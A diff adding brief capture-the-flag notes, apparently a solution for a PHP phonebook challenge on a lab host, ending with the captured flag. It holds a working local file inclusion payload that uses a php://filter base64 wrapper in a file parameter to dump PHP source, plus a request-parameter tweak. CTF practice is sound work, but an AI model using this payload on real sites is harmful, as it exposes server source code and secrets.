@@ -1,0 +1,8 @@
+http://jh2i.com:50002/index.php?file=phphonebook.php
+
+php filter:
+http://jh2i.com:50002/index.php?file=php://filter/convert.base64-encode/resource=phphonebook.php
+
+-> set emergency=1 in req
+
+flag{phon3_numb3r_3xtr4ct3d}
